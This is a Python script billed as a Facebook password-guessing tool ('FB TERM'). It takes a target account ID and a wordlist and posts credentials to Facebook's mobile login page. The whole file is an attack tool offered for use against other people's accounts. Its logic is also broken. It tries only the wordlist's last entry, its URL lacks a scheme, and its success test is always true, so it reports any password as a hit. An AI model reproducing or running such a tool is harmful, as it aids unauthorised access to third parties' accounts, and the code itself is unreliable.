import sys
from os import system
try:
	import requests
	from bs4 import BeautifulSoup
except:
	system('pip install requests')
	system('pip install bs4')
banner='''

███████╗██████╗░████████╗███████╗██████╗░███╗░░░███╗
██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗░████║
█████╗░░██████╦╝░░░██║░░░█████╗░░██████╔╝██╔████╔██║
██╔══╝░░██╔══██╗░░░██║░░░██╔══╝░░██╔══██╗██║╚██╔╝██║
██║░░░░░██████╦╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
╚═╝░░░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
# write "help" for to use
# Author  : HadsXdevPy'''
try:
	print(banner)
	while True:
		menu=input('# FB TERM - HadiJembot ~> ')
		if menu == 'help':
			print('''
			==================================
			# help        :  for help to use
			# set id      :  set target id
			# set word :  set wordlist pass
			# run         :  run attack pass
			''')
		elif 'set id' in menu:
			id=menu.split()[(-1)]
			print('id saved ~> '+id)
		elif '# set word' in menu:
			word=menu.split()[(-1)]
			print('# word saved ~> '+word)
			pw=open(word, 'r')
			for lines in pw:
				pas=lines.strip()
		elif menu == 'run':
			req=requests.post('m.facebook.com/login.php', data={'email':id, 'password':pas, 'submit':'submit'})
			req.content
			if 'Masuk dengan Satu Ketukan' or 'Login with One Tap' in req.text:
				print('# success : '+pas)
			else:
				print('# failed : '+pas)
		else:
				print('# Open your eyes')
except:
	print('kesalahan tak terduga')